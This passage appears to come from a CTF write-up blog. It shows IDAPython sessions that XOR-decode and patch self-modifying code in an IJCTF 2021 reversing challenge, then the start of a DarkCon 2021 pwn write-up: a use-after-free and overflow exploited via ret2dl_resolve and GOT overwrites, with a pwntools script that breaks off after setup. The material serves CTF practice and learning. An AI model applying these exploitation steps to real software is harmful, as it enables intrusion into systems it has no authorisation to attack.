[2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">Python&gt;b = [ch^0x13 for ch in list(get_bytes(0x5c75c6,0x160))]</span><br><span class="line">Python&gt;b</span><br><span class="line">[0x75, 0x68, 0xa9, 0xc5, 0xe7, 0x65, 0xd8, 0x44, 0x20, 0x20, 0x20, 0xe7, 0x65, 0xdc, 0x20, 0x20, 0x20, 0x20, 0xab, 0x65, 0xdc, 0x1b, 0x65, 0xd8, 0x2f, 0xad, 0x1e, 0x21, 0x20, 0x20, 0x68, 0x9a, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0xab, 0x65, 0xdc, 0x68, 0xb8, 0x2f, 0x96, 0x24, 0x22, 0xe0, 0xc8, 0x24, 0xa9, 0xe1, 0xab, 0x65, 0xdc, 0xa3, 0xe0, 0x21, 0x68, 0x9a, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x68, 0xb8, 0x2f, 0x96, 0x24, 0x22, 0x2f, 0x96, 0xe0, 0xe1, 0xc0, 0x24, 0x21, 0xe8, 0xa8, 0x65, 0xd7, 0xab, 0x65, 0xdc, 0xa3, 0xe0, 0x21, 0x68, 0x9a, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x68, 0xb8, 0x2f, 0x96, 0x24, 0x22, 0xe0, 0xc8, 0x24, 0xa9, 0xe1, 0x68, 0x9a, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0xab, 0x65, 0xdc, 0x68, 0xb8, 0x2f, 0x96, 0x24, 0x22, 0x2f, 0x96, 0xe0, 0xe1, 0xc0, 0x24, 0x21, 0xe8, 0xa8, 0x65, 0xd6, 0x2f, 0x96, 0x65, 0xd7, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa8, 0x65, 0xd7, 0x2f, 0x96, 0x65, 0xd7, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa8, 0x65, 0xd7, 0x2f, 0x96, 0x65, 0xd7, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa8, 0x65, 0xd7, 0x2f, 0x96, 0x65, 0xd6, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd6, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd6, 0x21, 0xe0, 0xa8, 0x65, 0xd6, 0x2f, 0x96, 0x65, 0xd6, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd6, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd6, 0x21, 0xe0, 0xa8, 0x65, 0xd6, 0xa0, 0x55, 0xd7, 0x33, 0xa0, 0x55, 0xd6, 0x17, 0x68, 0x99, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0xab, 0x65, 0xdc, 0x68, 0xb8, 0x2f, 0x96, 0x75, 0xd7, 0xa8, 0x34, 0x21, 0xab, 0x65, 0xdc, 0xa3, 0xe0, 0x21, 0x68, 0x99, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x68, 0xb8, 0x2f, 0x96, 0x75, 0xd6, 0xa8, 0x34, 0x21, 0xa3, 0x65, 0xdc, 0x22, 0xc9, 0x96, 0xde, 0xdf, 0xdf, 0xb0, 0x7d, 0xe3, 0x13]</span><br><span class="line">Python&gt;b = bytes([ch^0x13 for ch in list(get_bytes(0x5c75c6,0x160))])</span><br><span class="line">Python&gt;b</span><br><span class="line">b&#x27;uh\xa9\xc5\xe7e\xd8D   \xe7e\xdc    \xabe\xdc\x1be\xd8/\xad\x1e!  h\x9a`Q|     \xabe\xdch\xb8/\x96$&quot;\xe0\xc8$\xa9\xe1\xabe\xdc\xa3\xe0!h\x9a`Q|     h\xb8/\x96$&quot;/\x96\xe0\xe1\xc0$!\xe8\xa8e\xd7\xabe\xdc\xa3\xe0!h\x9a`Q|     h\xb8/\x96$&quot;\xe0\xc8$\xa9\xe1h\x9a`Q|     \xabe\xdch\xb8/\x96$&quot;/\x96\xe0\xe1\xc0$!\xe8\xa8e\xd6/\x96e\xd7\xa4\xe0Y+/\x96e\xd7!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd7!\xe0\xa8e\xd7/\x96e\xd7\xa4\xe0Y+/\x96e\xd7!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd7!\xe0\xa8e\xd7/\x96e\xd7\xa4\xe0Y+/\x96e\xd7!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd7!\xe0\xa8e\xd7/\x96e\xd6\xa4\xe0Y+/\x96e\xd6!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd6!\xe0\xa8e\xd6/\x96e\xd6\xa4\xe0Y+/\x96e\xd6!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd6!\xe0\xa8e\xd6\xa0U\xd73\xa0U\xd6\x17h\x99`Q|     \xabe\xdch\xb8/\x96u\xd7\xa84!\xabe\xdc\xa3\xe0!h\x99`Q|     h\xb8/\x96u\xd6\xa84!\xa3e\xdc&quot;\xc9\x96\xde\xdf\xdf\xb0&#125;\xe3\x13&#x27;</span><br><span class="line">Python&gt;patch_bytes(0x5C75C6,b)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">NameError: name &#x27;patch_bytes&#x27; is not defined</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5C75C6,b)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Python&gt;b = bytes([ch^0x33 for ch in list(get_bytes(0x5c75c6,0x160))])</span><br><span class="line">Python&gt;b</span><br><span class="line">b&#x27;F[\x9a\xf6\xd4V\xebw\x13\x13\x13\xd4V\xef\x13\x13\x13\x13\x98V\xef(V\xeb\x1c\x9e-\x12\x13\x13[\xa9SbO\x13\x13\x13\x13\x13\x98V\xef[\x8b\x1c\xa5\x17\x11\xd3\xfb\x17\x9a\xd2\x98V\xef\x90\xd3\x12[\xa9SbO\x13\x13\x13\x13\x13[\x8b\x1c\xa5\x17\x11\x1c\xa5\xd3\xd2\xf3\x17\x12\xdb\x9bV\xe4\x98V\xef\x90\xd3\x12[\xa9SbO\x13\x13\x13\x13\x13[\x8b\x1c\xa5\x17\x11\xd3\xfb\x17\x9a\xd2[\xa9SbO\x13\x13\x13\x13\x13\x98V\xef[\x8b\x1c\xa5\x17\x11\x1c\xa5\xd3\xd2\xf3\x17\x12\xdb\x9bV\xe5\x1c\xa5V\xe4\x97\xd3j\x18\x1c\xa5V\xe4\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe4\x12\xd3\x9bV\xe4\x1c\xa5V\xe4\x97\xd3j\x18\x1c\xa5V\xe4\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe4\x12\xd3\x9bV\xe4\x1c\xa5V\xe4\x97\xd3j\x18\x1c\xa5V\xe4\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe4\x12\xd3\x9bV\xe4\x1c\xa5V\xe5\x97\xd3j\x18\x1c\xa5V\xe5\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe5\x12\xd3\x9bV\xe5\x1c\xa5V\xe5\x97\xd3j\x18\x1c\xa5V\xe5\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe5\x12\xd3\x9bV\xe5\x93f\xe4\x00\x93f\xe5$[\xaaSbO\x13\x13\x13\x13\x13\x98V\xef[\x8b\x1c\xa5F\xe4\x9b\x07\x12\x98V\xef\x90\xd3\x12[\xaaSbO\x13\x13\x13\x13\x13[\x8b\x1c\xa5F\xe5\x9b\x07\x12\x90V\xef\x11\xfa\xa5\xed\xec\xec\x83N\xd0 &#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5C75C6,b)</span><br><span class="line">Command &quot;MakeCode&quot; failed</span><br><span class="line">Command &quot;JumpEnter&quot; failed</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Python&gt;b = bytes([ch^0x33 for ch in list(get_bytes(0x5c75c6,0x160))])</span><br><span class="line">Python&gt;b</span><br><span class="line">b&#x27;UH\x89\xe5\xc7E\xf8d\x00\x00\x00\xc7E\xfc\x00\x00\x00\x00\x8bE\xfc;E\xf8\x0f\x8d&gt;\x01\x00\x00H\xba@q\\\x00\x00\x00\x00\x00\x8bE\xfcH\x98\x0f\xb6\x04\x02\xc0\xe8\x04\x89\xc1\x8bE\xfc\x83\xc0\x01H\xba@q\\\x00\x00\x00\x00\x00H\x98\x0f\xb6\x04\x02\x0f\xb6\xc0\xc1\xe0\x04\x01\xc8\x88E\xf7\x8bE\xfc\x83\xc0\x01H\xba@q\\\x00\x00\x00\x00\x00H\x98\x0f\xb6\x04\x02\xc0\xe8\x04\x89\xc1H\xba@q\\\x00\x00\x00\x00\x00\x8bE\xfcH\x98\x0f\xb6\x04\x02\x0f\xb6\xc0\xc1\xe0\x04\x01\xc8\x88E\xf6\x0f\xb6E\xf7\x84\xc0y\x0b\x0f\xb6E\xf7\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf7\x01\xc0\x88E\xf7\x0f\xb6E\xf7\x84\xc0y\x0b\x0f\xb6E\xf7\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf7\x01\xc0\x88E\xf7\x0f\xb6E\xf7\x84\xc0y\x0b\x0f\xb6E\xf7\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf7\x01\xc0\x88E\xf7\x0f\xb6E\xf6\x84\xc0y\x0b\x0f\xb6E\xf6\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf6\x01\xc0\x88E\xf6\x0f\xb6E\xf6\x84\xc0y\x0b\x0f\xb6E\xf6\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf6\x01\xc0\x88E\xf6\x80u\xf7\x13\x80u\xf67H\xb9@q\\\x00\x00\x00\x00\x00\x8bE\xfcH\x98\x0f\xb6U\xf7\x88\x14\x01\x8bE\xfc\x83\xc0\x01H\xb9@q\\\x00\x00\x00\x00\x00H\x98\x0f\xb6U\xf6\x88\x14\x01\x83E\xfc\x02\xe9\xb6\xfe\xff\xff\x90]\xc33&#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5C75C6,b)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">5C75C6: using guessed type __int64 __fastcall sub_5C75C6();</span><br><span class="line">401000: using guessed type __int64 init_proc(void);</span><br><span class="line">406230: using guessed type __int64 __fastcall GLOBAL__sub_I_cxx11_locale_inst_cc(_QWORD, _QWORD, _QWORD);</span><br><span class="line">5BD728: using guessed type __int64 (__fastcall *_frame_dummy_init_array_entry[2])();</span><br><span class="line">5BD790: using guessed type __int64 (__fastcall *_do_global_dtors_aux_fini_array_entry[2])();</span><br><span class="line">Python&gt;c = bytes([ch^0x37 for ch in list(get_bytes(0x5c75c6,0x160))])</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Python&gt;c</span><br><span class="line">b&#x27;b\x7f\xbe\xd2\xf0r\xcfS777\xf0r\xcb7777\xbcr\xcb\x0cr\xcf8\xba\t677\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc0\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc18\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc18\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc1\xb7B\xc0$\xb7B\xc1\x00\x7f\x8ewFk77777\xbcr\xcb\x7f\xaf8\x81b\xc0\xbf#6\xbcr\xcb\xb4\xf76\x7f\x8ewFk77777\x7f\xaf8\x81b\xc1\xbf#6\xb4r\xcb5\xde\x81\xc9\xc8\xc8\xa7j\xf4\x04&#x27;</span><br><span class="line">Python&gt;c</span><br><span class="line">b&#x27;b\x7f\xbe\xd2\xf0r\xcfS777\xf0r\xcb7777\xbcr\xcb\x0cr\xcf8\xba\t677\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc0\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc18\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc18\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc1\xb7B\xc0$\xb7B\xc1\x00\x7f\x8ewFk77777\xbcr\xcb\x7f\xaf8\x81b\xc0\xbf#6\xbcr\xcb\xb4\xf76\x7f\x8ewFk77777\x7f\xaf8\x81b\xc1\xbf#6\xb4r\xcb5\xde\x81\xc9\xc8\xc8\xa7j\xf4\x04&#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5c7766,c)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Python&gt;c</span><br><span class="line">b&#x27;b\x7f\xbe\xd2\xf0r\xcfS777\xf0r\xcb7777\xbcr\xcb\x0cr\xcf8\xba\t677\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc0\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc18\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc18\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc1\xb7B\xc0$\xb7B\xc1\x00\x7f\x8ewFk77777\xbcr\xcb\x7f\xaf8\x81b\xc0\xbf#6\xbcr\xcb\xb4\xf76\x7f\x8ewFk77777\x7f\xaf8\x81b\xc1\xbf#6\xb4r\xcb5\xde\x81\xc9\xc8\xc8\xa7j\xf4\x04&#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5c7766,c)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Python&gt;c = bytes([ch^0x37 for ch in list(get_bytes(0x5c7766,0xf8))])</span><br><span class="line">Python&gt;c</span><br><span class="line">b&#x27;UH\x89\xe5H\xbe\xa8q\\\x00\x00\x00\x00\x00H\xbf \x9d\\\x00\x00\x00\x00\x00H\xb8\xd0\xfbF\x00\x00\x00\x00\x00\xff\xd0H\xbf\xa8q\\\x00\x00\x00\x00\x00H\xb8@\nM\x00\x00\x00\x00\x00\xff\xd0\x85\xc0\x0f\x94\xc0\x84\xc0\x0f\x84\xad\x00\x00\x00H\xbe\xb2q\\\x00\x00\x00\x00\x00H\xbf \x9d\\\x00\x00\x00\x00\x00H\xb8\x10\x03G\x00\x00\x00\x00\x00\xff\xd0H\xbf \x9d\\\x00\x00\x00\x00\x00H\xb8@\x05G\x00\x00\x00\x00\x00\xff\xd0H\xbe\xbfq\\\x00\x00\x00\x00\x00H\x89\xc7H\xb8\xd0\xf5M\x00\x00\x00\x00\x00\xff\xd0H\xba\x08\x9d\\\x00\x00\x00\x00\x00H\x89\x02H\xb8\x08\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\xba@q\\\x00\x00\x00\x00\x00H\xbe\xb8q\\\x00\x00\x00\x00\x00H\x89\xc7\xb8\x00\x00\x00\x00H\xb9\xf0\x07M\x00\x00\x00\x00\x00\xff\xd1H\xb8\x08\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\x89\xc7H\xb8\x80\xeeM\x00\x00\x00\x00\x00\xff\xd0\x90]\xc37&#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5c7766,c)</span><br></pre></td></tr></table></figure>



<h2 id="Family-rev"><a href="#Family-rev" class="headerlink" title="Family-rev"></a>Family-rev</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;p <span class="number">0x108</span>-<span class="number">0xe0</span></span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    p <span class="number">0x108</span>-<span class="number">0xe0</span></span><br><span class="line">          ^</span><br><span class="line">SyntaxError: invalid syntax</span><br><span class="line">Python&gt;<span class="number">0x108</span>-<span class="number">0xe0</span></span><br><span class="line"><span class="number">0x28</span></span><br><span class="line">Python&gt;get_bytes(here(),<span class="number">0x28</span>)</span><br><span class="line"><span class="string">b&#x27;e\xa7x\xe0\x0b\x854\x8dUJ\x08\xba\x95\xbfN\xe8\xb7\x98n\x12\xe1(\xa9p\xd3\xd1\x8b\x1e/\xf9\x97\x01\xe0\x15\x1eq\xe4wh\x11&#x27;</span></span><br><span class="line">Python&gt;<span class="built_in">list</span>(get_bytes(here(),<span class="number">0x28</span>))</span><br><span class="line">[<span class="number">0x3a</span>, <span class="number">0xf7</span>, <span class="number">0x0</span>, <span class="number">0x68</span>, <span class="number">0x6</span>, <span class="number">0x2e</span>, <span class="number">0x29</span>, <span class="number">0x89</span>, <span class="number">0xf4</span>, <span class="number">0x67</span>, <span class="number">0x2e</span>, <span class="number">0xc6</span>, <span class="number">0xd6</span>, <span class="number">0x6e</span>, <span class="number">0x12</span>, <span class="number">0x75</span>, <span class="number">0x1b</span>, <span class="number">0xba</span>, <span class="number">0x64</span>, <span class="number">0x44</span>, <span class="number">0x1b</span>, <span class="number">0x24</span>, <span class="number">0xa5</span>, <span class="number">0x30</span>, <span class="number">0x3a</span>, <span class="number">0xfe</span>, <span class="number">0xa7</span>, <span class="number">0xd</span>, <span class="number">0x74</span>, <span class="number">0xaf</span>, <span class="number">0x99</span>, <span class="number">0xce</span>, <span class="number">0x12</span>, <span class="number">0xe1</span>, <span class="number">0x1a</span>, <span class="number">0x92</span>, <span class="number">0x87</span>, <span class="number">0xf3</span>, <span class="number">0xdd</span>, <span class="number">0xdd</span>]</span><br><span class="line">Python&gt;get_bytes(here(),<span class="number">0x28</span>)</span><br><span class="line"><span class="string">b&#x27;:\xf7\x00h\x06.)\x89\xf4g.\xc6\xd6n\x12u\x1b\xbadD\x1b$\xa50:\xfe\xa7\rt\xaf\x99\xce\x12\xe1\x1a\x92\x87\xf3\xdd\xdd&#x27;</span></span><br><span class="line">Python&gt;get_bytes(here(),<span class="number">0x28</span>)</span><br><span class="line"><span class="string">b&#x27;\xbb\xf0\xd9\xf2(c\xa1\x93\x92\xc55\xeeG\x9a^\x86&amp;\xd7\xd5R\xb0d\x92\xe3\xe8L\x82\xa4\xb8\x9f\x9a\xc0\xa8\xce\x10z\xe3\xbf\xc7\xd5&#x27;</span></span><br><span class="line">Python&gt;get_bytes(here(),<span class="number">0x28</span>)</span><br><span class="line"><span class="string">b&#x27;\xc9\x06\xa4N]3\xcb\xe7\xca\xb3w\xe3d\x0c\x8b\xc8\xee\x14\xa2pB\x89\xbf\xe2&quot;\x1a\xb9\xf5\x9aq\xb2\xba&lt;&gt;m\xaf\xbd\n\x1d\x82&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>++v5;<br>regs.edx &#x3D; *(unsigned __int8 *)(v5 + 0x804A060);<br>lodsb al, byte [esi]<br>mov bl, al<br>regs.eax &#x3D; (unsigned __int8)(LOBYTE(regs.ebx) ^ LOBYTE(regs.edx));<br>mov bl, al<br>regs.edx &#x3D; *(unsigned __int8 *)(v5 + 0x804A020);<br>regs.eax &#x3D; LOBYTE(regs.ebx) + LOBYTE(regs.edx);<br>mov bl, al<br>regs.edx &#x3D; *(unsigned __int8 *)(v5 + 0x804A0A0);<br>regs.eax &#x3D; LOBYTE(regs.ebx) - LOBYTE(regs.edx);<br>mov bl, al<br>regs.edx &#x3D; *(unsigned __int8 *)(v5 + 0x804A0E0);<br>cmp bl, dl</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/08/16/2021ijctf/" data-id="cuidPZGMmQxV7o8DBWDqkWWoz" data-title="IJCTF 2021" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021darkconctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/25/2021darkconctf/" class="article-date">
  <time class="dt-published" datetime="2021-02-25T03:07:10.000Z" itemprop="datePublished">2021-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/25/2021darkconctf/">DarkCon 2021 CTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="no-output"><a href="#no-output" class="headerlink" title="no-output"></a>no-output</h2><p>Vulnerabilities:</p>
<ul>
<li>uaf in edit(0x40140c)</li>
<li>buffer overflow in init(0x401236)</li>
</ul>
<p>Exploit:</p>
<ul>
<li>no read or write function</li>
<li>no leak</li>
<li>return to dl_resolve<ul>
<li>write fake reloc&#x2F;sym in .bss use uaf</li>
<li>write free@GOT to init and <code>__stack_chk_fail</code> to ret</li>
<li>stack overflow for return to <code>dl_runtime_reslove</code></li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = <span class="string">&#x27;nooutput&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;13.233.166.242&quot;</span>, <span class="number">49153</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"><span class="comment"># p = process(&#x27;./nooutput&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./nooutput&#x27;</span>)</span><br><span class="line"></span><br><span 